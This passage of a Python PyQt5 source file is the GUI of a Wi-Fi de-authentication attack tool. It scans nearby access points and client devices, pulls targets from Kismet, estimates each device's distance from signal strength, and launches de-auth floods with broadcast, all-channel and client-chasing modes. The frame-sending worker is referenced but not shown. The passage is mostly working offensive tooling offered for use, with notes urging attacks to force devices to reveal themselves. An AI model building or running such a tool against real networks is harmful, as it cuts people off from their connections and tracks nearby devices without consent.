        self.ap_table.setEditTriggers(QtWidgets.QAbstractItemView.NoEditTriggers)
        self.ap_table.itemSelectionChanged.connect(self._on_target_selected)
        lay.addWidget(self.ap_table, 1)

        # attack controls
        atk = QtWidgets.QGroupBox("Attack")
        atk_lay = QtWidgets.QVBoxLayout(atk)
        self.target_label = QtWidgets.QLabel("Target: — (select an AP)")
        self.target_label.setStyleSheet("font-weight: bold;")
        atk_lay.addWidget(self.target_label)

        self.attack_status = QtWidgets.QLabel("○ inactivo")
        self.attack_status.setStyleSheet("color: #888888;")
        atk_lay.addWidget(self.attack_status)

        opts = QtWidgets.QHBoxLayout()
        self.chk_broadcast = QtWidgets.QCheckBox("Broadcast")
        self.chk_broadcast.setChecked(True)
        self.chk_allch = QtWidgets.QCheckBox("All channels")
        self.chk_follow = QtWidgets.QCheckBox("Perseguir cliente")
        self.chk_follow.setToolTip("Relocaliza el canal del cliente y sigue el de-auth cuando cambia.")
        self.clients_edit = QtWidgets.QLineEdit()
        self.clients_edit.setPlaceholderText("custom client MACs, comma-separated (optional)")
        opts.addWidget(self.chk_broadcast)
        opts.addWidget(self.chk_allch)
        opts.addWidget(self.chk_follow)
        opts.addWidget(self.clients_edit, 1)
        atk_lay.addLayout(opts)

        self.btn_deauth = QtWidgets.QPushButton("Start de-auth")
        self.btn_deauth.setEnabled(False)
        self.btn_deauth.setStyleSheet("padding: 8px; font-weight: bold;")
        self.btn_deauth.clicked.connect(self.toggle_deauth)
        atk_lay.addWidget(self.btn_deauth)
        lay.addWidget(atk)
        return box

    def _build_right_panel(self):
        self.right_tabs = QtWidgets.QTabWidget()
        self.right_tabs.addTab(self._build_stats_tab(), "Live stats")
        self.right_tabs.addTab(self._build_radar_tab(), "Distance radar")
        self.clients_tab = self._build_clients_tab()
        self.right_tabs.addTab(self.clients_tab, "Clients")
        self.kismet_tab = self._build_kismet_tab()
        self.right_tabs.addTab(self.kismet_tab, "Kismet")
        self.map3d_tab = self._build_map3d_tab()
        self.right_tabs.addTab(self.map3d_tab, "Mapa 3D")
        return self.right_tabs

    def _build_map3d_tab(self):
        box = QtWidgets.QWidget()
        lay = QtWidgets.QVBoxLayout(box)
        if not HAVE_MPL:
            lay.addWidget(QtWidgets.QLabel("matplotlib no está disponible; no se puede dibujar el 3D."))
            return box
        self.map3d = Map3DView()
        lay.addWidget(self.map3d, 1)

        ctl = QtWidgets.QHBoxLayout()
        ctl.addWidget(QtWidgets.QLabel("Eje Z:"))
        self.combo_z = QtWidgets.QComboBox()
        self.combo_z.addItems(["Banda (2.4 / 5 GHz)", "Señal (dBm)"])
        self.combo_z.currentIndexChanged.connect(self._recompute_map3d)
        ctl.addWidget(self.combo_z)
        ctl.addStretch(1)
        lay.addLayout(ctl)

        note = QtWidgets.QLabel(
            "Arrastra para rotar la vista. X/Y = distancia estimada con ángulo arbitrario; "
            "Z = banda o señal, NO altura física (una sola antena no puede medir encima/debajo).")
        note.setWordWrap(True)
        note.setStyleSheet("color: #d7ba7d; font-size: 11px;")
        lay.addWidget(note)
        return box

    def _recompute_map3d(self):
        if not HAVE_MPL or not hasattr(self, "map3d"):
            return
        z_mode = "signal" if self.combo_z.currentIndex() == 1 else "band"
        self.map3d.update_aps(self._last_aps, self.spin_tx.value(), self.spin_n.value(), z_mode)

    def _build_kismet_tab(self):
        box = QtWidgets.QWidget()
        lay = QtWidgets.QVBoxLayout(box)

        top = QtWidgets.QHBoxLayout()
        self.btn_kismet_start = QtWidgets.QPushButton("Iniciar Kismet")
        self.btn_kismet_start.setToolTip("Lanza Kismet localmente con la antena seleccionada y se conecta solo.")
        self.btn_kismet_start.clicked.connect(self.start_kismet)
        self.btn_kismet = QtWidgets.QPushButton("Conectar")
        self.btn_kismet.setToolTip("Conectar a un Kismet que ya esté corriendo.")
        self.btn_kismet.clicked.connect(self.toggle_kismet)
        self.kismet_status = QtWidgets.QLabel("desconectado")
        self.kismet_status.setStyleSheet("color: #888888;")
        self.kismet_filter = QtWidgets.QLineEdit()
        self.kismet_filter.setPlaceholderText("filtro (SSID / MAC / fabricante / tipo)…")
        self.kismet_filter.textChanged.connect(self._render_kismet)
        top.addWidget(self.btn_kismet_start)
        top.addWidget(self.btn_kismet)
        top.addWidget(self.kismet_status)
        top.addWidget(self.kismet_filter, 1)
        lay.addLayout(top)

        self._kismet_cols = ["Tipo", "Fabricante", "Nombre/MAC", "BSSID", "Canal", "Banda",
                             "Señal", "Paquetes", "Datos", "1ª vez", "Últ."]
        self.kismet_table = QtWidgets.QTableWidget(0, len(self._kismet_cols))
        self.kismet_table.setHorizontalHeaderLabels(self._kismet_cols)
        _km_hdr = self.kismet_table.horizontalHeader()
        _km_hdr.setSectionResizeMode(QtWidgets.QHeaderView.Interactive)
        _km_hdr.setStretchLastSection(True)
        self.kismet_table.setColumnWidth(1, 200)   # Fabricante
        self.kismet_table.setColumnWidth(2, 220)   # Nombre/MAC
        self.kismet_table.setEditTriggers(QtWidgets.QAbstractItemView.NoEditTriggers)
        self.kismet_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.kismet_table.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
        self.kismet_table.setAlternatingRowColors(True)
        lay.addWidget(self.kismet_table, 1)

        btns = QtWidgets.QHBoxLayout()
        self.btn_k2deauth = QtWidgets.QPushButton("Enviar a de-auth")
        self.btn_k2deauth.clicked.connect(self._kismet_send_to_deauth)
        btns.addWidget(self.btn_k2deauth)
        btns.addStretch(1)
        lay.addLayout(btns)

        note = QtWidgets.QLabel(
            "'Iniciar Kismet' lo lanza por ti con la antena seleccionada, configura credenciales "
            "y se conecta solo (verás su salida en el Log). 'Conectar' es para un Kismet que ya "
            "esté corriendo. Luego puedes enviar un dispositivo al de-auth. No uses a la vez el "
            "escáner propio de la GUI y Kismet sobre la misma antena.")
        note.setWordWrap(True)
        note.setStyleSheet("color: #d7ba7d; font-size: 11px;")
        lay.addWidget(note)
        return box

    def _build_clients_tab(self):
        box = QtWidgets.QWidget()
        lay = QtWidgets.QVBoxLayout(box)
        self.clients_label = QtWidgets.QLabel("Selecciona una red para ver sus dispositivos")
        self.clients_label.setStyleSheet("font-weight: bold;")
        self.clients_label.setWordWrap(True)
        lay.addWidget(self.clients_label)

        self._client_cols = ["Tipo", "Fabricante", "MAC", "Banda", "Canal", "RSSI",
                             "~Dist", "Estado", "Visto durante", "Últ. act.", "Paquetes", "Nota"]
        self.clients_table = QtWidgets.QTableWidget(0, len(self._client_cols))
        self.clients_table.setHorizontalHeaderLabels(self._client_cols)
        _cl_hdr = self.clients_table.horizontalHeader()
        _cl_hdr.setSectionResizeMode(QtWidgets.QHeaderView.Interactive)
        _cl_hdr.setStretchLastSection(True)
        self.clients_table.setColumnWidth(1, 220)   # Fabricante
        self.clients_table.setColumnWidth(2, 150)   # MAC
        self.clients_table.setEditTriggers(QtWidgets.QAbstractItemView.NoEditTriggers)
        self.clients_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.clients_table.setAlternatingRowColors(True)
        lay.addWidget(self.clients_table, 1)

        note = QtWidgets.QLabel(
            "Clientes detectados de forma pasiva mientras escaneas (solo cuando el escáner "
            "pasa por el canal del AP). Para acelerar, lanza un de-auth: los dispositivos se "
            "reconectan y aparecen. Muchos móviles usan MAC aleatoria, así que el fabricante "
            "puede no ser real. El 'Tipo' es una estimación por fabricante (OUI): orientativa, "
            "no siempre exacta. 'En línea' = actividad en los últimos 12 s.")
        note.setWordWrap(True)
        note.setStyleSheet("color: #d7ba7d; font-size: 11px;")
        lay.addWidget(note)
        return box

    def _build_stats_tab(self):
        box = QtWidgets.QWidget()
        lay = QtWidgets.QVBoxLayout(box)

        grid = QtWidgets.QGridLayout()
        self.lbl_sent = self._stat_label("0")
        self.lbl_pps = self._stat_label("0")
        self.lbl_clients = self._stat_label("0")
        self.lbl_channel = self._stat_label("—")
        self.lbl_elapsed = self._stat_label("0s")
        grid.addWidget(QtWidgets.QLabel("Frames sent"), 0, 0)
        grid.addWidget(self.lbl_sent, 0, 1)
        grid.addWidget(QtWidgets.QLabel("Frames/sec"), 1, 0)
        grid.addWidget(self.lbl_pps, 1, 1)
        grid.addWidget(QtWidgets.QLabel("Clients"), 2, 0)
        grid.addWidget(self.lbl_clients, 2, 1)
        grid.addWidget(QtWidgets.QLabel("Channel"), 3, 0)
        grid.addWidget(self.lbl_channel, 3, 1)
        grid.addWidget(QtWidgets.QLabel("Elapsed"), 4, 0)
        grid.addWidget(self.lbl_elapsed, 4, 1)
        lay.addLayout(grid)

        pg.setConfigOptions(antialias=True)
        self.plot = pg.PlotWidget()
        self.plot.setBackground("#1e1e1e")
        self.plot.setTitle("De-auth frames per second")
        self.plot.setLabel("left", "frames/s")
        self.plot.setLabel("bottom", "seconds ago")
        self.plot.showGrid(x=True, y=True, alpha=0.3)
        self.curve = self.plot.plot(pen=pg.mkPen("#ff5555", width=2))
        lay.addWidget(self.plot, 1)
        return box

    def _build_radar_tab(self):
        box = QtWidgets.QWidget()
        lay = QtWidgets.QVBoxLayout(box)

        self.radar = RadarView()
        lay.addWidget(self.radar, 1)

        ctl = QtWidgets.QHBoxLayout()
        ctl.addWidget(QtWidgets.QLabel("RSSI @1m (dBm):"))
        self.spin_tx = QtWidgets.QSpinBox()
        self.spin_tx.setRange(-80, -10)
        self.spin_tx.setValue(-40)
        self.spin_tx.setToolTip("Potencia de referencia: RSSI medido a 1 metro del AP.")
        self.spin_tx.valueChanged.connect(self._recompute_radar)
        ctl.addWidget(self.spin_tx)
        ctl.addSpacing(12)
        ctl.addWidget(QtWidgets.QLabel("factor n:"))
        self.spin_n = QtWidgets.QDoubleSpinBox()
        self.spin_n.setRange(1.6, 5.0)
        self.spin_n.setSingleStep(0.1)
        self.spin_n.setValue(2.7)
        self.spin_n.setToolTip("Exponente de propagación: ~2 campo abierto, 3-4 interiores.")
        self.spin_n.valueChanged.connect(self._recompute_radar)
        ctl.addWidget(self.spin_n)
        ctl.addSpacing(12)
        btn_fit = QtWidgets.QPushButton("Ajustar vista")
        btn_fit.clicked.connect(lambda: self.radar.fit())
        ctl.addWidget(btn_fit)
        ctl.addStretch(1)
        lay.addLayout(ctl)

        note = QtWidgets.QLabel(
            "Arrastra para desplazarte y usa la rueda para hacer zoom; 'Ajustar vista' recentra. "
            "Distancia estimada por RSSI (modelo log-distance): es un radio aproximado, "
            "NO una posición — una sola antena no da dirección, así que el ángulo es "
            "arbitrario. Precisión ±varios metros; calibra RSSI@1m y n para tu entorno.")
        note.setWordWrap(True)
        note.setStyleSheet("color: #d7ba7d; font-size: 11px;")
        lay.addWidget(note)
        return box

    def _stat_label(self, text):
        lbl = QtWidgets.QLabel(text)
        lbl.setStyleSheet("font-size: 20px; font-weight: bold; color: #4ec9b0;")
        return lbl

    def _build_log(self):
        box = QtWidgets.QGroupBox("Log")
        lay = QtWidgets.QVBoxLayout(box)
        self.log_view = QtWidgets.QPlainTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setMaximumBlockCount(500)
        self.log_view.setFixedHeight(130)
        lay.addWidget(self.log_view)
        return box

    def _warn_banner(self):
        self.log_msg("WARNING: not running as root — scanning and injection will fail. "
                     "Relaunch with: sudo python3 -m wifi_deauth.gui")

    # ---- helpers --------------------------------------------------------
    def current_iface(self):
        data = self.iface_combo.currentData()
        return data if data else None

    def log_msg(self, msg):
        ts = time.strftime("%H:%M:%S")
        self.log_view.appendPlainText(f"[{ts}] {msg}")

    def refresh_interfaces(self):
        self.iface_combo.blockSignals(True)
        self.iface_combo.clear()
        for iface, driver in list_wifi_interfaces():
            self.iface_combo.addItem(f"{iface}  ({driver})", iface)
        self.iface_combo.blockSignals(False)
        self._update_mode_label()
        self.log_msg("Interfaces refreshed")

    def _update_mode_label(self):
        iface = self.current_iface()
        if not iface:
            self.mode_label.setText("mode: —")
            return
        mode = interface_mode(iface)
        color = "#4ec9b0" if mode == "monitor" else "#d7ba7d"
        self.mode_label.setText(f"mode: {mode}")
        self.mode_label.setStyleSheet(f"font-weight: bold; color: {color};")
        self.btn_monitor.setText("Disable monitor" if mode == "monitor" else "Enable monitor")

    # ---- interface actions ---------------------------------------------
    def toggle_monitor(self):
        iface = self.current_iface()
        if not iface:
            return
        if interface_mode(iface) == "monitor":
            self.log_msg(f"Setting {iface} back to managed...")
            ok = disable_monitor_mode(iface)
        else:
            self.log_msg(f"Enabling monitor mode on {iface}...")
            ok = enable_monitor_mode(iface)
        self.log_msg("OK" if ok else "FAILED (need root? interface busy?)")
        self._update_mode_label()

    def kill_nm(self):
        self.log_msg("Stopping NetworkManager...")
        self.log_msg("OK" if kill_networkmanager() else "FAILED (need root?)")

    # ---- scan -----------------------------------------------------------
    def toggle_scan(self):
        if self.scan_worker and self.scan_worker.isRunning():
            self.scan_worker.stop()
            self.scan_worker.wait(3000)
            self.scan_worker = None
            self.btn_scan.setText("Start scan")
            return

        iface = self.current_iface()
        if not iface:
            self.log_msg("No interface selected")
            return
        if interface_mode(iface) != "monitor":
            QtWidgets.QMessageBox.warning(self, "Monitor mode required",
                                          f"{iface} is not in monitor mode. Enable it first.")
            return
        self.ap_table.setRowCount(0)
        self._row_by_bssid.clear()
        channels = get_supported_channels(iface)
        self.scan_worker = ScanWorker(iface, channels,
                                      self.ssid_filter.text().strip(),
                                      self.bssid_filter.text().strip())
        self.scan_worker.ap_found.connect(self._upsert_ap)
        self.scan_worker.aps_snapshot.connect(self._update_radar)
        self.scan_worker.channel_changed.connect(lambda c: self.lbl_channel.setText(str(c)))
        self.scan_worker.device_lost.connect(self._on_device_lost)
        self.scan_worker.log.connect(self.log_msg)
        self.scan_worker.start()
        self.btn_scan.setText("Stop scan")

    def _on_device_lost(self):
        if self.scan_worker:
            self.scan_worker.wait(1500)
            self.scan_worker = None
        self.btn_scan.setText("Start scan")
        self._update_mode_label()
        self.log_msg("Escaneo detenido: reactiva 'Enable monitor' y vuelve a escanear.")
        QtWidgets.QMessageBox.warning(
            self, "Interfaz perdida",
            f"{self.current_iface() or 'La interfaz'} dejó de estar disponible "
            "(reset USB del adaptador o volvió a modo managed).\n\n"
            "Pulsa 'Enable monitor' para reactivarla y luego 'Start scan'.\n\n"
            "Consejo: no uses Kismet y el escáner de la GUI sobre la misma antena a la vez.")

    def _upsert_ap(self, ap):
        """Insert a new AP row, or update the existing one in place (keyed by BSSID)."""
        bssid = ap["bssid"]
        signal = f"{ap['signal']} dBm" if ap.get("signal") is not None else "—"
        values = [ap["name"], str(ap["channel"]), bssid, ap["band"], signal]
        row = self._row_by_bssid.get(bssid)
        if row is None:
            row = self.ap_table.rowCount()
            self.ap_table.insertRow(row)
            self._row_by_bssid[bssid] = row
        hidden = ap.get("hidden", False)
        for col, val in enumerate(values):
            item = self.ap_table.item(row, col)
            if item is None:
                item = QtWidgets.QTableWidgetItem()
                self.ap_table.setItem(row, col, item)
            item.setText(val)
            item.setToolTip(val)          # nombre completo al pasar el ratón
            item.setData(QtCore.Qt.UserRole, ap)
            font = item.font()
            font.setItalic(hidden)        # hidden networks shown in italics
            item.setFont(font)
        # if the revealed/updated AP is the current target, refresh its label
        if self.target and self.target.get("bssid") == bssid:
            self.target = ap
            self.target_label.setText(f"Target: {ap['name']}  [{bssid}]  ch {ap['channel']}")

    def _update_radar(self, aps):
        self._last_aps = aps
        # keep the table's signal column live too
        for ap in aps:
            row = self._row_by_bssid.get(ap["bssid"])
            if row is not None and ap.get("signal") is not None:
                item = self.ap_table.item(row, 4)
                if item is not None:
                    item.setText(f"{ap['signal']} dBm")
        self._recompute_radar()
        self._recompute_map3d()
        if self._selected_bssid:
            self._refresh_clients()

    def _recompute_radar(self):
        if hasattr(self, "radar"):
            self.radar.update_aps(self._last_aps, self.spin_tx.value(), self.spin_n.value())

    # ---- Kismet -------------------------------------------------------------
    def toggle_kismet(self):
        if self.kismet_worker and self.kismet_worker.isRunning():
            self.kismet_worker.stop()
            self.kismet_worker.wait(3000)
            self.kismet_worker = None
            self.btn_kismet.setText("Conectar")
            self.kismet_status.setText("desconectado")
            self.kismet_status.setStyleSheet("color: #888888;")
            return
        self._kismet_connect()

    def _kismet_connect(self):
        if self.kismet_worker and self.kismet_worker.isRunning():
            return
        client = KismetClient.from_config()
        if not client.username:
            QtWidgets.QMessageBox.warning(
                self, "Kismet",
                "No encontré credenciales de Kismet en ~/.kismet/kismet_httpd.conf "
                "(ni en /root/.kismet). Usa 'Iniciar Kismet' o crea el usuario en su web una vez.")
            return
        self.kismet_worker = KismetWorker(client)
        self.kismet_worker.status.connect(self._on_kismet_status)
        self.kismet_worker.error.connect(self._on_kismet_error)
        self.kismet_worker.devices.connect(self._on_kismet_devices)
        self.kismet_worker.start()
        self.btn_kismet.setText("Desconectar")
        self.kismet_status.setText("conectando…")
        self.kismet_status.setStyleSheet("color: #d7ba7d;")

    # ---- launch a local Kismet ourselves -----------------------------------
    def start_kismet(self):
        # already running one we launched? -> stop it
        if self.kismet_proc is not None and self.kismet_proc.state() != QtCore.QProcess.NotRunning:
            self._stop_kismet_proc()
            return
        if not shutil.which("kismet"):
            QtWidgets.QMessageBox.warning(self, "Kismet", "No encuentro el binario 'kismet' en el PATH.")
            return
        if os.geteuid() != 0:
            QtWidgets.QMessageBox.warning(self, "Kismet",
                                          "Lanzar Kismet necesita root. Abre la GUI como root.")
            return
        iface = self.current_iface() or "wlan1"
        # our own scanner and Kismet can't share one radio
        if self.scan_worker and self.scan_worker.isRunning():
            self.toggle_scan()
        ensure_kismet_credentials()
        self.kismet_proc = QtCore.QProcess(self)
        self.kismet_proc.setProcessChannelMode(QtCore.QProcess.MergedChannels)
        self.kismet_proc.readyReadStandardOutput.connect(self._kismet_proc_output)
        self.kismet_proc.finished.connect(self._kismet_proc_finished)
        self.log_msg(f"Iniciando Kismet (fuente {iface})…")
        self.kismet_status.setText("iniciando Kismet…")
        self.kismet_status.setStyleSheet("color: #d7ba7d;")
        self.kismet_proc.start("kismet", ["--no-ncurses", "-c", iface])
        self.btn_kismet_start.setText("Detener Kismet")
        # give it a few seconds to bring up the API, then connect
        QtCore.QTimer.singleShot(6000, self._kismet_connect)

    def _kismet_proc_output(self):
        if not self.kismet_proc:
            return
        data = bytes(self.kismet_proc.readAllStandardOutput()).decode("utf-8", "ignore")
        for line in data.splitlines():
            line = line.strip()
            if line:
                self.log_msg(f"kismet: {line}")

    def _kismet_proc_finished(self, *_):
        self.log_msg("Kismet (local) terminó.")
        self.btn_kismet_start.setText("Iniciar Kismet")

    def _stop_kismet_proc(self):
        if self.kismet_worker and self.kismet_worker.isRunning():
            self.kismet_worker.stop()
            self.kismet_worker.wait(2000)
            self.kismet_worker = None
            self.btn_kismet.setText("Conectar")
        if self.kismet_proc is not None:
            self.log_msg("Deteniendo Kismet…")
            self.kismet_proc.terminate()
            if not self.kismet_proc.waitForFinished(4000):
                self.kismet_proc.kill()
                self.kismet_proc.waitForFinished(2000)
        self.btn_kismet_start.setText("Iniciar Kismet")
        self.kismet_status.setText("desconectado")
        self.kismet_status.setStyleSheet("color: #888888;")

    def _on_kismet_status(self, msg):
        self.kismet_status.setText(msg)
        self.kismet_status.setStyleSheet("color: #4ec9b0;")
        self.log_msg(f"Kismet: {msg}")

    def _on_kismet_error(self, msg):
        self.kismet_status.setText("error")
        self.kismet_status.setStyleSheet("color: #ff5555;")
        self.log_msg(f"Kismet error: {msg}")

    def _on_kismet_devices(self, devices):
        self._kismet_all = devices
        self._render_kismet()

    def _render_kismet(self):
        flt = self.kismet_filter.text().lower().strip()
        rows = self._kismet_all
        if flt:
            rows = [d for d in rows if flt in
                    (d.get("mac", "") + d.get("name", "") + d.get("manuf", "")
                     + d.get("type", "")).lower()]
        rows = sorted(rows, key=lambda d: d.get("last") or 0, reverse=True)
        self.kismet_table.setRowCount(0)
        for d in rows:
            r = self.kismet_table.rowCount()
            self.kismet_table.insertRow(r)
            sig = d.get("signal")
            vals = [
                d.get("type", ""),
                d.get("manuf", ""),
                d.get("name") or d.get("mac", ""),
                d.get("bssid", ""),
                d.get("channel", ""),
                d.get("band", ""),
                f"{sig} dBm" if isinstance(sig, int) else "—",
                str(d.get("packets", 0)),
                _fmt_bytes(d.get("datasize", 0)),
                _fmt_ts(d.get("first")),
                _fmt_ts(d.get("last")),
            ]
            for c, v in enumerate(vals):
                item = QtWidgets.QTableWidgetItem(v)
                item.setToolTip(v)
                item.setData(QtCore.Qt.UserRole, d)
                self.kismet_table.setItem(r, c, item)

    @staticmethod
    def _safe_int(value, default):
        try:
            return int(str(value).split(",")[0].strip())
        except (TypeError, ValueError):
            return default

    def _use_as_target(self, ap):
        self.target = ap
        self._selected_bssid = ap["bssid"]
        self.target_label.setText(f"Target: {ap['name']}  [{ap['bssid']}]  ch {ap['channel']}")
        self.btn_deauth.setEnabled(True)

    def _kismet_send_to_deauth(self):
        items = self.kismet_table.selectedItems()
        if not items:
            self.log_msg("Kismet: selecciona un dispositivo primero")
            return
        d = items[0].data(QtCore.Qt.UserRole)
        typ = (d.get("type") or "").lower()
        if "ap" in typ:
            ap = {"name": d.get("name") or d.get("mac"), "bssid": d.get("mac"),
                  "channel": self._safe_int(d.get("channel"), 1),
                  "band": d.get("band", "—"), "hidden": False, "signal": d.get("signal")}
            self._use_as_target(ap)
            self.log_msg(f"Kismet: objetivo AP {ap['bssid']} (ch {ap['channel']})")
        else:
            bssid = d.get("bssid")
            if not bssid:
                self.log_msg("Kismet: ese dispositivo no tiene un BSSID asociado conocido")
                return
            ap = {"name": bssid, "bssid": bssid,
                  "channel": self._safe_int(d.get("channel"), 1),
                  "band": d.get("band", "—"), "hidden": False, "signal": None}
            self._use_as_target(ap)
            self.clients_edit.setText(d.get("mac", ""))
            self.chk_broadcast.setChecked(False)
            self.log_msg(f"Kismet: objetivo cliente {d.get('mac')} en AP {bssid}")

    def _on_target_selected(self):
        items = self.ap_table.selectedItems()
        if not items:
            return
        ap = items[0].data(QtCore.Qt.UserRole)
        self.target = ap
        self.target_label.setText(f"Target: {ap['name']}  [{ap['bssid']}]  ch {ap['channel']}")
        self.btn_deauth.setEnabled(True)
        self._selected_bssid = ap["bssid"]
        self._refresh_clients()
        if hasattr(self, "right_tabs"):
            self.right_tabs.setCurrentWidget(self.clients_tab)

    def _refresh_clients(self):
        bssid = self._selected_bssid
        ap = next((a for a in self._last_aps if a.get("bssid") == bssid), None)
        clients = ap.get("clients", []) if ap else []
        name = ap["name"] if ap else "—"
        tx, n = self.spin_tx.value(), self.spin_n.value()
        now = time.time()
        online = sum(1 for c in clients if now - c.get("last", 0) <= 12)
        self.clients_label.setText(
            f"{name}  [{bssid or '—'}]    {len(clients)} dispositivo(s)  ·  {online} en línea")
        self.clients_table.setRowCount(0)
        for c in sorted(clients, key=lambda x: x.get("last", 0), reverse=True):
            row = self.clients_table.rowCount()
            self.clients_table.insertRow(row)
            mac = c["mac"]
            rssi = c.get("rssi")
            dist = RadarView.estimate_distance(rssi, tx, n)
            vendor = vendor_for(mac)
            is_online = now - c.get("last", 0) <= 12
            dur = c.get("last", now) - c.get("first", now)
            vals = [
                classify_device(vendor, mac),
                vendor,
                mac,
                c.get("band", "—"),
                str(c.get("channel", "—")),
                f"{rssi} dBm" if rssi is not None else "—",
                f"~{dist:.1f} m" if dist is not None else "—",
                "● En línea" if is_online else "○ Standby",
                fmt_duration(dur),
                f"hace {fmt_duration(now - c.get('last', now))}",
                str(c.get("packets", 0)),
                "MAC aleatoria" if mac_is_randomized(mac) else "",
            ]
            for col, v in enumerate(vals):
                item = QtWidgets.QTableWidgetItem(v)
                item.setToolTip(v if col != 0 else f"{v} · {vendor}")
                if col == 7:
                    item.setForeground(QtGui.QColor("#4ec9b0" if is_online else "#888888"))
                self.clients_table.setItem(row, col, item)

    # ---- deauth ---------------------------------------------------------
    def toggle_deauth(self):
        if self.deauth_worker and self.deauth_worker.isRunning():
            self.deauth_worker.stop()
            self.deauth_worker.wait(3000)
            self.deauth_worker = None
            self.btn_deauth.setText("Start de-auth")
            self.btn_scan.setEnabled(True)
            self.attack_status.setText("○ inactivo")
            self.attack_status.setStyleSheet("color: #888888;")
            return

        if not self.target:
            self.log_msg("No target selected")
            return
        iface = self.current_iface()
        if interface_mode(iface) != "monitor":
            QtWidgets.QMessageBox.warning(self, "Monitor mode required",
                                          f"{iface} is not in monitor mode.")
            return

        # a running channel-hopping scan would fight the deauth for the radio
        if self.scan_worker and self.scan_worker.isRunning():
            self.toggle_scan()

        clients = [c.strip() for c in self.clients_edit.text().split(",") if c.strip()]
        follow = self.chk_follow.isChecked()
        # chasing and all-channels both need the channel list to hop over
        channels = get_supported_channels(iface) if (self.chk_allch.isChecked() or follow) else None
        self.deauth_worker = DeauthWorker(
            iface=iface,
            bssid=self.target["bssid"],
            channel=self.target["channel"],
            custom_clients=clients,
            broadcast=self.chk_broadcast.isChecked(),
            all_channels=self.chk_allch.isChecked(),
            channels=channels,
            follow=follow,
        )
        self.deauth_worker.stats.connect(self._on_stats)
        self.deauth_worker.client_found.connect(lambda m: self.log_msg(f"New client: {m}"))
        self.deauth_worker.log.connect(self.log_msg)
        self._start_time = time.time()
        self._pps_history.clear()
        self._last_sent = 0
        self._last_sent_t = time.time()
        self.deauth_worker.start()
        self.btn_deauth.setText("Stop de-auth")
        self.btn_scan.setEnabled(False)
        self.attack_status.setText("● DE-AUTH ACTIVO" + ("  (persiguiendo cliente)" if follow else ""))
        self.attack_status.setStyleSheet("color: #ff5555; font-weight: bold;")
        self.right_tabs.setCurrentIndex(0)   # show the live frames/s chart

    def _on_stats(self, total_sent, clients):
        self.lbl_sent.setText(str(total_sent))
        self.lbl_clients.setText(str(clients))

    def _tick(self):
        if self.deauth_worker and self.deauth_worker.isRunning():
            total = int(self.lbl_sent.text() or "0")
            now = time.time()
            dt = now - self._last_sent_t
            pps = (total - self._last_sent) / dt if dt > 0 else 0
            self._last_sent, self._last_sent_t = total, now
            self._pps_history.append(pps)
            self.lbl_pps.setText(f"{pps:.0f}")
            xs = list(range(-len(self._pps_history) + 1, 1))
            self.curve.setData(xs, list(self._pps_history))
            self.lbl_elapsed.setText(f"{int(now - self._start_time)}s")

    def closeEvent(self, event):
        for w in (self.scan_worker, self.deauth_worker, self.kismet_worker):
            if w and w.isRunning():
                w.stop()
                w.wait(2000)
        if self.kismet_proc is not None and self.kismet_proc.state() != QtCore.QProcess.NotRunning:
            self.kismet_proc.terminate()
            if not self.kismet_proc.waitForFinished(3000):
                self.kismet_proc.kill()
        event.accept()


def main():
    if "linux" not in sys.platform:
        print("Only linux is supported.", file=sys.stderr)
        sys.exit(1)
    app = QtWidgets.QApplication(sys.argv)
    app.setStyle("Fusion")
    win = MainWindow()
    win.show()
    if os.geteuid() != 0:
        QtWidgets.QMessageBox.warning(win, "Root required",
                                      "wifi-deauth needs root to sniff and inject frames.\n"
                                      "Relaunch with:\n\n    sudo python3 -m wifi_deauth.gui")
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
